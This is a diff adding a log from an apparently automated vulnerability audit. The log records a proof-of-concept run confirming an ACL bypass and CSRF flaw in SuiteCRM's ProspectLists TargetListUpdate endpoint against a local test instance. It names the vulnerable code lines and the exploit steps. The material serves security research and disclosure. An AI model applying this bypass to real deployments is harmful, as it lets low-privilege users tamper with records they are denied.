@@ -1,0 +1,26 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-050/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-050/../.venv
+========================================================================
+VULN-050: targetlistupdate: no-ACL add-to-list (uids branch) + CSRF
+target: http://localhost:33116
+========================================================================
+[INFO] sink: modules/ProspectLists/TargetListUpdate.php:79 (uids, no buildAccessWhere) and :95/:104 (retrieve()+add(), no ACL)
+[SETUP] admin web + legacy REST session
+[SETUP] create low-priv RegularUser L
+[OK] low-priv user mod_7259d2ed id=fa45f0ef-b1c9-43aa-8441-faa8da1d0a7d
+[SETUP] restrict L: Contacts 'view' = ACL_ALLOW_NONE (throwaway Role, scoped to L only)
+[OK] role 03628972-71d6-4ae0-9229-909d2e454f3b denies Contacts view/list for mod_7259d2ed
+[SETUP] admin creates two Contacts assigned to admin (L cannot view either)
+[OK] Contact C1=4350a7d1-c540-4066-9f2e-46cf1a21d8d4 (Ctgt1_78b6601d), C2=a6c64019-ea96-4129-9801-d788db5d2f73 (Ctgt2_5a5be519), both owned by admin
+[STEP] low-priv L: baseline DetailView(C1) -- expect ACL 'noaccess' block
+[INFO] baseline DetailView status=200 contact-name-visible=False (expect False)
+[SETUP] low-priv L creates L's own ProspectList PL
+[OK] ProspectList PL=f009c879-fdd1-49bc-85b9-c4236c46b684 (PL_06106f1a) owned by L
+[STEP] targetlistupdate uids=C1 (with normal Referer) -- functionality proof
+[INFO] targetlistupdate(C1) -> HTTP 302 loc='index.php?action=DetailView&module=&record=&return_module=&return_action=DetailView'
+[STEP] targetlistupdate uids=C2 (NO Referer header at all) -- CSRF proof
+[INFO] targetlistupdate(C2, no Referer) -> HTTP 302 loc='index.php?action=DetailView&module=&record=&return_module=&return_action=DetailView'
+[STEP] db-verify prospect_lists_prospects rows for C1 and C2 under PL
+[PROOF] prospect_lists_prospects rows: [{'related_id': '4350a7d1-c540-4066-9f2e-46cf1a21d8d4', 'related_type': 'Contacts', 'prospect_list_id': 'f009c879-fdd1-49bc-85b9-c4236c46b684', 'deleted': '0'}, {'related_id': 'a6c64019-ea96-4129-9801-d788db5d2f73', 'related_type': 'Contacts', 'prospect_list_id': 'f009c879-fdd1-49bc-85b9-c4236c46b684', 'deleted': '0'}]
+[OK] L (denied Contacts view/list ACL) added BOTH admin-owned Contacts to L's own list PL=f009c879-fdd1-49bc-85b9-c4236c46b684; the second add used zero Referer header (CSRF-reachable).
+==> VULN-050: CONFIRMED — uids-branch ACL bypass: C1=4350a7d1.. and C2=a6c64019.. (no-Referer) both linked into PL=f009c879.. despite denied view ACL
